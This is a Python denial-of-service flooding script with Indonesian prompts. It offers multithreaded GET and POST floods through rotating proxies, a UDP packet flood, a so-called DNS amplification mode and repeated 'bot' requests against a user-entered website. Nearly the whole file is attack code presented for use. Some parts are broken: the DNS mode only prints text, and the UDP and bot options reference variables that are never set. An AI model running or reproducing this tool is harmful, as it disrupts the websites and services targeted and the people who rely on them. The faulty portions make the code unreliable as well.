import random
import string
import requests
import threading
from time import sleep
from itertools import cycle
import socket

def send_request(url, proxy_pool):
    while True:
        try:
            proxy = next(proxy_pool)
            proxies = {"http": proxy, "https": proxy}
            response = requests.get(url, proxies=proxies, timeout=5)
            print(f"\033[1;32m[ Attack ] URL: {url} | Proxy: {proxy} | Thread: {threading.current_thread().name}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[ ERROR ] Proxy gagal: {proxy} | {e}\033[0m")
            continue

def send_post_request(url, proxy_pool):
    while True:
        try:
            proxy = next(proxy_pool)
            proxies = {"http": proxy, "https": proxy}
            response = requests.post(url, proxies=proxies, timeout=5)
            print(f"\033[1:32m[ Attack ] URL: {url} | Proxy: {proxy} | Thread: {threading.current_thread().name}\033[0m")
        except Exception as e:
            print(f"\033[91m[ ERROR ] Proxy gagal: {proxy} | {e}\033[0m")
            continue

def udp_flood(url, proxy_pool):
    while True:
        try:
            proxy = next(proxy_pool)
            proxies = {"http": proxy, "https": proxy}
            target_ip = socket.gethostbyname(url)
            target_port = random.randint(1024, 65535)
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client.sendto(random._urandom(1024), (target_ip, target_port))
            print(f"\033[1;32m[ UDP Attack ] URL: {url} | Proxy: {proxy} | Thread: {threading.current_thread().name}\033[0m")
        except Exception as e:
            print(f"\033[91m[ ERROR ] UDP Attack failed: {proxy} | {e}\033[0m")
            continue

def dns_amplification(url, dns_server):
    while True:
        try:
            target_ip = socket.gethostbyname(url)
            dns_request = f"GET {target_ip} {dns_server}"
            print(f"\033[92m[ DNS Attack ] {dns_request} Thread: {threading.current_thread().name}\033[0m")
            sleep(0.1)
        except Exception as e:
            print(f"\033[91m[ ERROR ] DNS Attack failed: {e}\033[0m")
            continue

def fake_bot_traffic(url):
    while True:
        try:
            response = requests.get(url)
            print(f"\033[92m[ Bot Attack ] URL: {url} | Thread: {threading.current_thread().name}\033[0m")
        except Exception as e:
            print(f"\033[91m[ ERROR ] Bot traffic failed: {e}\033[0m")
            continue

def load_proxies(file_path):
    try:
        with open(file_path, "r") as file:
            proxies = [line.strip() for line in file if line.strip()]
        if not proxies:
            raise ValueError("File proxy kosong.")
        return proxies
    except Exception as e:
        print(f"\033[91m[ ERROR ] Tidak dapat memuat proxy: {e}\033[0m")
        exit()

def main():
    print("\033[1;31m1. \033[1;36mGET")
    print("\033[1;31m2. \033[1;36mPOST")
    print("\033[1;31m3. \033[1;36mUDP Flood")
    print("\033[1;31m4. \033[1;36mDNS Amplification")
    print("\033[1;31m5. \033[1;36mFake Bot Traffic")

    choice = input("\033[1;36mMasukkan jenis serangan \033[1;32m(get/post/udp/dns/bot): \033[0m").strip().lower()
    url = input("\033[1;36mMasukkan URL website: \033[0m").strip()
    threads = int(input("\033[1;36mMasukkan jumlah thread: \033[0m"))

    if choice not in ["get", "post", "udp", "dns", "bot"]:
        print("\033[91m[ ERROR ] Pilihan tidak valid. Harap masukkan get, post, udp, dns, atau bot.\033[0m")
        return

    if choice in ["get", "post"]:
        proxy_file = input("\033[1;36mMasukkan path file proxy.txt: \033[0m").strip()
        proxies = load_proxies(proxy_file)
        proxy_pool = cycle(proxies)

    print(f"\033[92m[ INFO ] Memulai serangan ke {url} dengan {threads} thread...\033[0m")

    for _ in range(threads):
        if choice == "get":
            thread = threading.Thread(target=send_request, args=(url, proxy_pool))
            thread.start()
        elif choice == "post":
            thread = threading.Thread(target=send_post_request, args=(url, proxy_pool))
            thread.start()
        elif choice == "udp":
            thread = threading.Thread(target=udp_flood, args=(url, proxy_pool))
            thread.start()
        elif choice == "dns":
            dns_server = input("\033[93mMasukkan server DNS target: \033[0m").strip()
            thread = threading.Thread(target=dns_amplification, args=(url, dns_server))
            thread.start()
        elif choice == "bot":
            thread = threading.Thread(target=fake_bot_traffic, args=(url,))
            thread.start()

if __name__ == "__main__":
    main()
